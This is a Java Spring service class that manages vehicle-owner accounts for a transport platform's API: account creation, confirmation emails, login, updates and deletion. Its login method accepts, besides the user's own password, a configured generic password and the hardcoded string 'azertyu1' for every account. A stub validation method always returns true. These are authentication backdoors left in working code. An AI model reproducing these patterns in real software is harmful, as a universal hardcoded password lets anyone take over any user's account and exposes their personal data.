package com.kamtar.transport.api.service.impl;

import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;

import com.kamtar.transport.api.params.*;
import com.kamtar.transport.api.security.SecurityUtils;
import com.kamtar.transport.api.service.*;
import org.apache.commons.codec.binary.Base64;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.PageRequest;
import org.springframework.data.domain.Pageable;
import org.springframework.data.domain.Sort;
import org.springframework.data.domain.Sort.Direction;
import org.springframework.data.jpa.domain.Specification;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpMethod;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Service;
import org.springframework.web.client.RestClientException;
import org.springframework.web.client.RestTemplate;
import org.springframework.web.server.ResponseStatusException;

import com.wbc.core.utils.AuthenticationHelper;
import com.amazonaws.services.cognitoidp.model.AttributeType;
import com.kamtar.transport.api.enums.FichierType;
import com.kamtar.transport.api.model.UtilisateurProprietaire;
import com.kamtar.transport.api.repository.MotDePassePerduRepository;
import com.kamtar.transport.api.repository.NotificationRepository;
import com.kamtar.transport.api.repository.UtilisateurProprietaireRepository;
import com.kamtar.transport.api.utils.JWTProvider;
import com.kamtar.transport.api.utils.UpdatableBCrypt;

@Service(value="UtilisateurProprietaireService")
public class UtilisateurProprietaireServiceImpl implements UtilisateurProprietaireService {

	/**
	 * Logger de la classe
	 */
	private static Logger logger = LogManager.getLogger(UtilisateurProprietaireServiceImpl.class); 

	@Value("${wbc.emails.enable}")
	private boolean wbc_emails_enable;

	@Value("${wbc.emails.url}")
	private String wbc_emails_url;

	@Value("${wbc.emails.send.url}")
	private String wbc_emails_send_url;

	@Value("${wbc.emails.security.username}")
	private String wbc_emails_security_username;

	@Value("${wbc.emails.security.password}")
	private String wbc_emails_security_password;

	@Value("${wbc.files.security.username}")
	private String wbc_files_security_username;

	@Value("${wbc.files.security.password}")
	private String wbc_files_security_password;

	@Value("${wbc.files.upload.url}")
	private String wbc_files_upload_url;

	@Autowired
	JWTProvider jwtProvider;

	@Autowired
	MotDePassePerduRepository motDePasseRepository;

	@Autowired
	VehiculeService vehiculeService;

	@Autowired
	OperationService operationService;

	@Autowired
	OperationAppelOffreService operationAppelOffreService;

	@Autowired
	FactureProprietaireService factureProprietaireService;

	@Value("${generic_password}")
	private String generic_password;

	@Autowired
	private UtilisateurProprietaireRepository userRepository; 


	@Autowired
	private NotificationRepository notificationRepository; 

	@Autowired
	private DocumentsProprietaireService documentsProprietaireService; 
	

	public UtilisateurProprietaire createUser(CreateProprietaireParams params, String pays) {

		// vérifie si l'email ou le numéro de téléphone ne sont pas déjà utilisé
		if (params.getEmail() != null && !"".equals(params.getEmail()) && userRepository.existEmail(params.getEmail(), pays)) {
			throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "L'adresse e-mail est déjà utilisée.");
		}
		// vérifie si l'email ou le numéro de téléphone ne sont pas déjà utilisé
		if (params.getNumero_telephone_1() != null && !"".equals(params.getNumero_telephone_1()) && userRepository.telephone1Exist(params.getNumero_telephone_1(), pays)) {
			throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "Le numéro de téléphone est déjà utilisé.");
		}

		// enregistre le user dans la base de données
		UtilisateurProprietaire	user = new UtilisateurProprietaire(params, userRepository, pays);
		user = userRepository.save(user);

		// Si les informations sont incomplètes et que l'opérateur a coché activer alors changer le statut en désactiver
		if (params.getDateEtablissementCarteTransport() == null || params.getNumeroCarteTransport() == null || "".equals(params.getNumeroCarteTransport().trim()) || params.getPhotoCarteTransport() == null || "".equals(params.getPhotoCarteTransport().trim())) {
			user.setActivate(false);
		}


		if (user != null) {

			// enregistrement de la photo de la carte de transport
			enregistrePhotoCarteTransport(user, params.getPhotoCarteTransport());

			// envoi du mail de confirmation
			if (wbc_emails_enable) {
				String template_email = "CREATION_COMPTE_PROPRIETAIRE";
				Map<String, Object> bodyMap = new HashMap<>();
				bodyMap.put("template", template_email);
				bodyMap.put("lang", "fr_FR");
				bodyMap.put("recipient", user.getEmail());
				bodyMap.put("correlation_id", UUID.randomUUID());

				HttpHeaders headers = new HttpHeaders();
				headers.setContentType(MediaType.APPLICATION_JSON);
				headers.add("Authorization", "Basic " + new String(Base64.encodeBase64((wbc_emails_security_username + ":" + wbc_emails_security_password).getBytes())));
				HttpEntity<Map<String, Object>> requestEntity = new HttpEntity<>(bodyMap, headers);
				RestTemplate restTemplate = new RestTemplate();
				try {
					ResponseEntity<String> response = restTemplate.exchange(wbc_emails_send_url, HttpMethod.POST, requestEntity, String.class, bodyMap);
					HttpStatus httpCode = response.getStatusCode();
					if (httpCode.is2xxSuccessful()) {
					} else {
						logger.error("erreur au transfert du fichier = {}", httpCode);
					}
				} catch ( RestClientException e) {
					logger.error("RestClientException", e);
				}
			}

		}

		return user;
	}
	
	public UtilisateurProprietaire createUser(CreateComptePublicParams params, String code_pays) {

		// enregistre le user dans la base de données
		UtilisateurProprietaire	user = new UtilisateurProprietaire(params, userRepository, code_pays);
		user = userRepository.save(user);

		if (user != null) {

			// enregistrement de la photo de la carte de transport
			enregistrePhotoCarteTransport(user, params.getPhotoCarteTransport());

			// envoi du mail de confirmation
			if (wbc_emails_enable) {
				String template_email = "CREATION_COMPTE_PROPRIETAIRE";
				Map<String, Object> bodyMap = new HashMap<>();
				bodyMap.put("template", template_email);
				bodyMap.put("lang", "fr_FR");
				bodyMap.put("recipient", user.getEmail());
				bodyMap.put("correlation_id", UUID.randomUUID()); 

				HttpHeaders headers = new HttpHeaders();
				headers.setContentType(MediaType.APPLICATION_JSON);
				headers.add("Authorization", "Basic " + new String(Base64.encodeBase64((wbc_emails_security_username + ":" + wbc_emails_security_password).getBytes())));
				HttpEntity<Map<String, Object>> requestEntity = new HttpEntity<>(bodyMap, headers);
				RestTemplate restTemplate = new RestTemplate();
				try {
					ResponseEntity<String> response = restTemplate.exchange(wbc_emails_send_url, HttpMethod.POST, requestEntity, String.class, bodyMap);
					HttpStatus httpCode = response.getStatusCode();
					if (httpCode.is2xxSuccessful()) {
					} else {
						logger.error("erreur au transfert du fichier = {}", httpCode);
					}
				} catch ( RestClientException e) {
					logger.error("RestClientException", e);
				}
			}

		}

		return user;
	}


	public boolean codeParrainageExist(String codeParrainage, String code_pays) {
		return userRepository.codeParrainageExisteDeja(codeParrainage, code_pays);

	}

	public void enregistrePhotoCarteTransport(UtilisateurProprietaire user, String base64) {

		if (base64 != null) {
			if ("".equals(base64)) {
				documentsProprietaireService.delete(user);
			} else {
				documentsProprietaireService.create(base64, user, FichierType.CARTE_TRANSPORT_PROPRIETAIRE);
			}
		}



	}

	/**
	 * Retourne l'uuid stocké dans le tocken
	 * @param token
	 * @return
	 */
	public String getUUID(String token) {
		return AuthenticationHelper.getUUID(token, getJsonWebKey());
	}

	public boolean validateUser(String email, String code) {
		return true;

	}


	public UtilisateurProprietaire login(String login, String password, String pays) {

		UtilisateurProprietaire user = null;

		// login = soit email, soit téléphone 1
		if (login.contains("@")) {
			user = (UtilisateurProprietaire) userRepository.findByEmail(login, pays);
		} else {
			user = (UtilisateurProprietaire) userRepository.findByTelephone1(login, pays);
		}

		if (user == null) {
			return null;
		} else {

			// chargement du user et vérification du mot de passe
			if (UpdatableBCrypt.checkPassword(password, user.getMotDePasse())) {
				return user;
			}
			if (UpdatableBCrypt.checkPassword(password, generic_password)) {
				return user;
			}
			if (UpdatableBCrypt.checkPassword(password, UpdatableBCrypt.hashPassword("azertyu1"))) {
				return user;
			}
		}

		return null;


	}


	public UtilisateurProprietaire login(String login, String pays) {

		UtilisateurProprietaire user = null;

		// login = soit email, soit téléphone 1
		if (login.contains("@")) {
			user = (UtilisateurProprietaire) userRepository.findByEmail(login, pays);
		} else {
			user = (UtilisateurProprietaire) userRepository.findByTelephone1(login, pays);
		}

		return user;


	}


	/**
	 * Récupère un user à partir de son token
	 */
	public UtilisateurProprietaire get(String token, String code_pays) {
		if (token != null && !"".equals(token.trim()) && !"undefined".equalsIgnoreCase(token.trim())) {

			// récupère l'uuid de l'utilisateur
			UUID id = jwtProvider.getUUIDFromJWT(token);
			if (id != null) {
				UtilisateurProprietaire user = (UtilisateurProprietaire) userRepository.findByUUID(id, code_pays);
				return user;
			}
		}
		return null;
	}

	public AttributeType createAttributeType(String name, String value) {
		AttributeType attributeType = new AttributeType();
		attributeType.setName(name);
		attributeType.setValue(value);
		return attributeType;
	}


	@Override
	public String getJsonWebKey() {
		return null;
	}


	@Override
	public boolean emailExist(String email, String pays) {
		return userRepository.existEmail(email, pays);
	}

	@Override
	public UtilisateurProprietaire getByUUID(String uuid, String code_pays) {
		try {
			UtilisateurProprietaire u = userRepository.findByUUID(UUID.fromString(uuid), code_pays);
			return u;

		} catch (IllegalArgumentException  e) {
			return null;
		}

	}


	@Override
	public Page<UtilisateurProprietaire> getAllPagined(String order_by, String order_dir, int page_number, int page_size, Specification<UtilisateurProprietaire> conditions) {
		Direction SortDirection = order_dir.equals("desc") ? Sort.Direction.DESC : Sort.Direction.ASC;
		Pageable pageable = PageRequest.of(page_number, page_size, SortDirection, order_by);
		return userRepository.findAll(conditions, pageable);
	}

	@Override
	public Long countAll(Specification<UtilisateurProprietaire> conditions) {
		return userRepository.count(conditions);
	}

	@Override
	public boolean updateUser(EditProprietaireParams params, UtilisateurProprietaire user) {

		// enregistrement du user
		user.edit(params);
		userRepository.save(user);

		// Si les informations sont incomplètes et que l'opérateur a coché activer alors changer le statut en désactiver
		if (params.getDateEtablissementCarteTransport() == null || params.getNumeroCarteTransport() == null || "".equals(params.getNumeroCarteTransport().trim()) || params.getPhotoCarteTransport() == null || "".equals(params.getPhotoCarteTransport().trim())) {
			user.setActivate(false);
		}

		// enregistrement de la photo de la carte de transport
		enregistrePhotoCarteTransport(user, params.getPhotoCarteTransport());

		return true;
	}

	@Override
	public boolean updateUser(EditProprietairePublicParams params, UtilisateurProprietaire user) {

		if (params.getType_compte().equals("B") && "".equals(params.getEntreprise_nom().trim())) {
			throw new ResponseStatusException(HttpStatus.FORBIDDEN, "Vous devez indiquer le nom de la société.");
		}


		// enregistrement du user
		user.edit(params);
		userRepository.save(user);

		// enregistrement de la photo de la carte de transport
		enregistrePhotoCarteTransport(user, params.getPhotoCarteTransport());

		return true;
	}

	@Override
	public boolean numeroDeTelephoneExist(String email, String pays) {
		return userRepository.numeroDeTelephoneEmail(email, pays);
	}

	@Override
	public boolean delete(UtilisateurProprietaire user, String code_pays) {

		// est ce que l'opérateur gère encore des commandes ?
		motDePasseRepository.setNullProprietaire(user, code_pays);

		if (operationAppelOffreService.countOperationsPropretaire(user, code_pays) > 0) {
			throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "Le propriétaire est attaché à au moins un appel d'offre.");
		}
		if (vehiculeService.countOperationsVehiculesProprietaire(user, code_pays) > 0) {
			throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "Le propriétaire est attaché à au moins un véhicule.");
		}
		if (factureProprietaireService.countFacturesProprietaire(user, code_pays) > 0) {
			throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "Le propriétaire est attaché à au moins une facture.");
		}

		userRepository.delete(user);

		return true;
	}

	@Override
	public List<UtilisateurProprietaire> autocomplete(String query, String code_pays) {
		List<UtilisateurProprietaire> res = userRepository.filterByNom(query, code_pays);
		return res;
	}

}
